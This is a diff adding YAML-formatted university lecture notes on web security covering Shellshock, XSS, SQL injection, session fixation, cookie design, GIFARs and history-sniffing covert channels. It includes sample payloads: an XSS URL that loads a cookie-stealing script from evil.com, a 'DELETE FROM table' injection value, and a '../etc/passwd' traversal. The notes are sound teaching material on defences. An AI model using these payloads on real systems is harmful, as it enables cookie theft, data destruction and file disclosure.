@@ -1,0 +1,1104 @@
+- en: Web Security, part II
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: '**Note:** These lecture notes were slightly modified from the ones posted on
+    the 6.858 [course website](http://css.csail.mit.edu/6.858/2014/schedule.html)
+    from 2014.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Last lecture, we looked at a core security mechanism for the web: the same-origin
+    policy.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this lecture, we'll continue to look at how we can build secure web applications.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '"Shell shock"-like exploits'
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The recent "Shell Shock" bug is a good example of *how **difficult** it is to
+    design web services that compose multiple technologies*.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'A web client can include extra headers in its HTTP requests, and determine
+    which query parameters are in a request. Example:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE0]'
+  prefs: []
+  type: TYPE_PRE
+- en: CGI servers map the various components of the HTTP request to Unix environment
+    variables.
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Vulnerability:** Bash has a parsing bug in the way that it handles the setting
+    of environment variables! If a string begins with a certain set of malformed bytes,
+    bash will continue to parse the rest of the string and execute any commands that
+    it finds! For example, if you set an environment variable to a value like this...'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE1]'
+  prefs: []
+  type: TYPE_PRE
+- en: '...will confuse the bash parser, and cause it to execute the `/bin/id` command
+    (which displays the UID and GID information for the current user).'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Live demo:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE2]'
+  prefs: []
+  type: TYPE_PRE
+- en: 'More information: http://seclists.org/oss-sec/2014/q3/650'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Cross-site scripting (XSS) attacks
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Shell Shock is a particular instance of security bugs which arise from **improper
+    content sanitzation.** Another type of content sanitzation failure occurs during
+    cross-site scripting attacks (XSS).
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Example: Suppose that a CGI script embeds a query string parameter in the HTML
+    that it generates.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Demo:**'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '[PRE3]'
+  prefs: []
+  type: TYPE_PRE
+- en: Why is cross-site scripting so prevalent?
+  prefs: []
+  type: TYPE_NORMAL
+- en: Dynamic web sites incorporate user content in HTML pages (e.g., comments sections).
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Web sites host uploaded user documents.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: HTML documents can contain arbitrary Javascript code!
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Non-HTML documents may be content-sniffed as HTML by browsers.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Insecure Javascript programs may directly execute code that comes from external
+    parties (e.g., eval(), setTimeout(), etc.).
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: XSS defenses
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Chrome and IE have a built-in feature which uses **heuristics to detect potential
+    cross-site scripting attacks.**
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Ex: Is a script which is about to execute included in the request that fetched
+    the enclosing page?'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`http://foo.com?q=<script src="evil.com/cookieSteal.js"/>`'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If so, this is strong evidence that something suspicious is about to happen!
+    The attack above is called a "reflected XSS attack," because the server "reflects"
+    or "returns" the attacker-supplied code to the user's browser, executing it in
+    the context of the victim page.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: This is why our first XSS attack in the CGI example didn't work--the browser
+    detected reflected JavaScript in the URL, and removed the trailing `</script>`
+    before it even reached the CGI server.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: However ...
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '*Filters don''t have 100% coverage*, because there are a huge number of ways
+    to encode an XSS attack! [https://www.owasp.org/index.php/XSS*Filter*Evasion*Cheat*Sheet]'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: This is why our second XSS attack succeeded---the browser got confused by our
+    intentionally malformed HTML.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Problem: Filters can''t catch **persistent XSS attacks** in which the server
+    saves attacker-provided data, which is then permanently distributed to clients.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Classic example: A "comments" section which allows users to post HTML messages.'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Another example: Suppose that a dating site allows users to include HTML in
+    their profiles. An attacker can add HTML that will run in a *different* user''s
+    browser when that user looks at the attacker''s profile! Attacker could steal
+    the user''s cookie.'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Another XSS defense: **"httponly" cookies.**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: A server can tell a browser that client-side JavaScript should not be able to
+    access a cookie. [The server does this by adding the "HttpOnly" token to a "Set-Cookie"
+    HTTP response value.]
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: This is only a partial defense, since the attacker can still issue requests
+    that contain a user's cookies (CSRF).
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Privilege separation:** Use a separate domain for untrusted content.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: For example, Google stores untrusted content in `googleusercontent.com` (e.g.,
+    cached copies of pages, Gmail attachments).
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Even if XSS is possible in the untrusted content, the attacker code will run
+    in a different origin.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: There may still be problems if the content in googleusercontent.com points to
+    URLs in google.com.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Content sanitization:** Take untrusted content and encode it in a way that
+    constrains how it can be interpreted.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Ex: **Django templates:** Define an output page as a bunch of HTML that has
+    some "holes" where external content can be inserted.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[Automatic HTML escaping in Django](https://docs.djangoproject.com/en/dev/topics/templates/#automatic-html-escaping)'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: A template might contain code like this ...
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`<b>Hello {{ name }} </b>`'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '... where "name" is a variable that is resolved when the page is processed
+    by the Django template engine. That engine will take the value of "name" (e.g.,
+    from a user-supplied HTTP query string), and then automatically escape dangerous
+    characters. For example,'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: angle brackets `<` and `>` `--> &lt;` and `&gt;`
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: double quotes `" --> &quot;`
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: This prevents untrusted content from injecting HTML into the rendered page.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Templates cannot defend against all attacks! For example . . .
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`<div class={{ var }}>...</div>`'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: if `var` equals `class1 onmouseover=javascript:func()`
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '...then there may be an XSS attack, depending on how the browser parses the
+    malformed HTML.'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: So, content sanitization kind-of works, but it's **extremely difficult to parse
+    HTML in an unambigous way.**
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Possibly better approach: Completely disallow externally-provided HTML, and
+    force external content to be expressed in a smaller language (e.g., [Markdown](http://daringfireball.net/projects/markdown/syntax)).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Validated Markdown can then be translated into HTML.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Content Security Policy (CSP):** Allows a web server to tell the browser
+    which kinds of resources can be loaded, and the allowable origins for those resources.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Server specifies one or more headers of the type `Content-Security-Policy`.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[PRE4]'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  type: TYPE_PRE
+- en: You can specify separate policies for where images can come from, where scripts
+    can come from, frames, plugins, etc.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: CSP also prevents inline JavaScript, and JavaScript interfaces like `eval()`
+    which allow for dynamic JavaScript generation.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Some browsers allow servers to disable content-type sniffing (`X-Content-Type-Options:
+    nosniff`).'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: SQL injection attacks
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: 'Suppose that the application needs to issue SQL query based on user input:'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`query = "SELECT * FROM table WHERE userid=" + userid`'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Problem: adversary can supply `userid` that changes SQL query structure, e.g.,'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`"0; DELETE FROM table;"`'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: What if we add quoting around userid?
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`query = "SELECT * FROM table WHERE userid=''" + userid + "''"`'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The vulnerability still exists! The attacker can just add another quote as first
+    byte of `userid`.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Real solution:** unambiguously encode data.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Ex: replace '' with \'', etc.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: SQL libraries provide escaping functions.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Django defines a **query abstraction layer** which sits atop SQL and allows
+    applications to avoid writing raw SQL (although they can do it if they really
+    want to).
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: (Possibly fake) German license plate which says ";DROP TABLE" to avoid speeding
+    cameras which use OCR+SQL to extract license plate number.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: You can also run into problems if untrusted entities can supply filenames.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Ex: Suppose that a web server reads files based on user-supplied parameters.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`open("/www/images/" + filename)` Problem: filename might look like this:'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '`../../../../../etc/passwd`'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'As with SQL injection, the server must sanitize the user input: the server
+    must reject file names with slashes, or encode the slashes in some way.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Django
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Moderately popular web framework, used by some large sites like Instagram, Mozilla,
+    and Pinterest.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: A "web framework" is a software system that provides infrastructure for tasks
+    like database accesses, session management, and the creation of templated content
+    that can be used throughout a site.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Other frameworks are more popular: PHP, Ruby on Rails.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: In the enterprise world, Java servlets and ASP are also widely used.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Django developers have put some amount of thought into security.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: So, Django is a good case study to see how people implement web security in
+    practice.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Django is probably better in terms of security than some of the alternatives
+    like PHP or Ruby on Rails, but the devil is in the details.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'As we''ll discuss two lectures from now, researchers have invented some frameworks
+    that offer provably better security. [Ur/Web: http://www.impredicative.com/ur/]'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Session management: cookies'
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '[Dos and Don''ts of Client Authentication on the Web](http://pdos.csail.mit.edu/papers/webauth:sec10.pdf)'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Zoobar, Django, and many web frameworks put a **random session ID** in the cookie.
+  prefs: []
+  type: TYPE_NORMAL
+- en: The Session ID refers to an entry in some session table on the web server. The
+    entry stores a bunch of per-user information.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Session cookies are *sensitive*: adversary can use them to impersonate a user!'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: As we discussed last lecture, the same-origin policy helps to protect cookies
+    ...
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '... but you **shouldn''t share a domain with sites that you don''t trust!**
+    Otherwise, those sites can launch a **session fixation** attack:'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Learn more on [Wikipedia, Session fixation](https://en.wikipedia.org/wiki/Session_fixation)
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Attacker gets victim to visit a link or a website that sets the attacker specified
+    session ID in the victim's cookie.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Attacker can exploit a server that accepts any session identifier from query
+    strings and give the victim a URL like `lol.com/?PHPSID=abcd`
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: The session ID can be chosen by the attacker or returned by the server when
+    the attacker logs in.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Or, attacker can exploit a browser vulnerability that allows `a.example.com`
+    to set a cookie for `b.example.com`. Attacker gets victim to visit his website
+    `b.website.com`, which sets the cookie for the victim's `a.website.com`
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: User navigates to the victim site; the attacker-choosen session ID is sent to
+    the server and used to identify the user's session entry.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Later, the attacker can navigate to the victim site using the attacker-chosen
+    session id, and access the user's state!
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: There's a **big if** here. This attack only works on clueless victims who do
+    not notice that the account they are logged into is not theirs.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_OL
+  type: TYPE_NORMAL
+- en: Hmmm, but what if we don't want to have server-side state for every logged in
+    user?
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Stateless cookies
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: If you don't have the notion of a session, then you need to authenticate every
+    request!
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Idea:** Authenticate the cookie using cryptography.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Primitive: Message authentication codes (MACs)'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Think of it like a keyed hash, e.g., `HMAC-SHA1: H(k, m)`'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Client and server share a key; client uses key to produce the message, and the
+    server uses the key to verify the message.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'AWS S3 REST Services use this kind of cookie: [REST Authentication](http://docs.aws.amazon.com/AmazonS3/latest/dev/RESTAuthentication.html).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Amazon gives each developer an AWS Access Key ID, and an AWS secret key. Each
+    request looks like this:'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[PRE5]'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_IND
+  type: TYPE_PRE
+- en: 'Here''s what is signed (this is slightly simplified, see the link above for
+    the full story):'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[PRE6]'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_IND
+  type: TYPE_PRE
+- en: Note that this kind of cookie doesn't expire in the traditional sense (although
+    the server will reject the request if Amazon has revoked the user's key).
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: You can embed an "expiration" field in a *particular* request, and then hand
+    that URL to a third-party, such that, if the third-party waits too long, AWS will
+    reject the request as expired.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[PRE7]'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_IND
+  type: TYPE_PRE
+- en: Note that the format for the string-to-hash should provide unambiguous parsing!
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Ex: No component should be allowed to embed the escape character, otherwise
+    the server-side parser may get confused.'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Q:** How do you log out with this kind of cookie design? **A:** Impossible,
+    if the server is stateless (closing a seesion would require a server-side table
+    of revoked cookies).'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: If server can be stateful, session IDs make this much simpler.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: There's a fundamental trade-off between reducing server-side memory state and
+    increasing server-side computation overhead for cryptography.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Alternatives to cookies for session management
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Use **HTML5 local storage**, and implement your own authentication in Javascript.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Some web frameworks like Meteor do this.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Benefit: The cookie is not sent over the network to the server.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Benefit: Your authentication scheme is not subject to complex same-origin policy
+    for cookies (e.g., DOM storage is bound to a single origin, unlike a cookie, which
+    can be bound to multiple subdomains).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Client-side X.509 certificates.**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Benefit: Web applications can''t steal or explicitly manipulate each other''s
+    certificates.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Drawback:** Have weak story for revocation (we''ll talk about this more in
+    future lectures).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Drawback:** Poor usability---users don''t want to manage a certificate for
+    each site that they visit!'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Benefit/drawback:** There isn''t a notion of a session, since the certificate
+    is "always on." For important operations, the application will have to prompt
+    for a password.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: HTTP protocol ambiguities
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: The web stack has some protocol ambiguities that can lead to security holes.
+  prefs: []
+  type: TYPE_NORMAL
+- en: HTTP header injection from XMLHttpRequests
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Javascript can ask browser to add extra headers in the request. So, what happens
+    if we do this?
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[PRE8]'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  type: TYPE_PRE
+- en: The server at foo.com may interpret this as two separate requests! Later, **when
+    the browser receives the second request, it may overwrite a cache entry belonging
+    to bar.com with content from foo.com!**
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Solution:** Prevent XMLHttpRequests from setting sensitive fields like `Host:`
+    or `Content-Length`.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Takehome point:** Unambiguous encoding is critical! Build reliable escaping/encoding!'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: URL parsing ("The Tangled Web" page 154)
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Flash had a slightly different URL parser than the browser.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Suppose the URL was http://example.com:80@foo.com/
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Flash would compute the origin as "example.com".
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Browser would compute the origin as "foo.com".
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Bad idea:** complex parsing rules just to determine the principal.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Bad idea:** re-implementing complex parsing code.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Here's a **hilarious/terrifying** way to launch attacks using Java applets that
+    are stored in the .jar format.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: In 2007, Lifehacker.com posted an article which described how you could hide
+    .zip files inside of .gif files.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Leverage the fact that image renderers process a file top-down, whereas decompressors
+    for .zip files typically start from the end and go upwards.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Attackers realized that .jar files are based on the .zip format!
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**THUS THE *GIFAR* WAS BORN**: half-gif, half-jar, all-evil.'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'Really simple to make a GIFAR: Just use "cat" on Linux or "cp" on Windows.'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Suppose that target.com only allows external parties to upload images objects.
+    The attacker can upload a GIFAR, and the GIFAR will pass target.com's image validation
+    tests!
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Then, if the attacker can launch a XSS attack, the attacker can inject HTML
+    which refers to the ".gif" as an applet.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '[PRE9]'
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_IND
+  type: TYPE_PRE
+- en: The browser will load that applet and give it the authority of target.com!
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Covert channel attacks
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Web applications are also vulnerable to covert channel attacks.
+  prefs: []
+  type: TYPE_NORMAL
+- en: A **covert channel** is a mechanism which allows two applications to exchange
+    information, even though the security model prohibits those applications from
+    communicating.
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: The channel is "covert" because it doesn't use official mechanisms for cross-app
+    communication.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Example #1: CSS-based sniffing attacks**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Attacker has a website that he can convince the user to visit.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Attacker goal:** Figure out the other websites that the user has visited
+    (e.g., to determine the user''s political views, medical history, etc.).'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Exploit vector:** A web browser uses different colors to display visited
+    versus unvisited links! So, attacker page can generate a big list of candidate
+    URLs, and then inspect the colors to see if the user has visited any of them.'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Can check thousands of URLs a second!
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Can go breadth-first, find hits for top-level domains, then go depth-first for
+    each hit.
+  prefs:
+  - PREF_IND
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Fix:** Force getComputedStyle() and related JavaScript interfaces to always
+    say that a link is unvisited. [https://blog.mozilla.org/security/2010/03/31/plugging-the-css-history-leak/]'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Example #2: Cache-based attacks**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Attacker setup and goal are the same as before.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Exploit vector:** It''s much faster for a browser to access data that''s
+    cached instead of fetching it over the network. So, attacker page can generate
+    a list of candidate images, try to load them, and see which ones load quickly!'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: This attack can reveal your location if the candidate images come from geographically
+    specific images, e.g., Google Map tiles. [http://w2spconf.com/2014/papers/geo_inference.pdf]
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Fix:** No good ones. A page could never cache objects, but this will hurt
+    performance. But suppose that a site doesn''t cache anything. Is it safe from
+    history sniffing? No!'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Example #3: DNS-based attacks**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Attacker setup and goal are the same as before.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Exploit vector:** Attacker page generates references to objects in various
+    domains. If the user has already accessed objects from that domain, the hostnames
+    will already reside in the DNS cache, making subsequent object accesses faster!
+    [http://sip.cs.princeton.edu/pub/webtiming.pdf]'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Fix:** No good ones. Could use raw IP addresses for links, but this breaks
+    a lot of things (e.g., DNS-based load balancing). However, suppose that a site
+    doesn''t cache anything and uses raw IP addresses for hostnames. Is it safe from
+    history sniffing? No!'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Example #4: Rendering attacks.**'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Attacker setup and goal are the same as before.
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Exploit vector:** Attacker page loads a candidate URL in an iframe. Before
+    the browser has fetched the content, the attacker page can access ... `window.frames[1].location.href`
+    ... and read the value that the attacker set. However, once the browser has fetched
+    the content, accessing that reference will return "undefined" due to the same-origin
+    policy. So, the attacker can poll the value and see how long it takes to turn
+    "undefined". If it takes a long time, the page must not have been cached! [http://lcamtuf.coredump.cx/cachetime/firefox.html]'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Fix:** Stop using computers?'
+  prefs:
+  - PREF_IND
+  - PREF_UL
+  type: TYPE_NORMAL
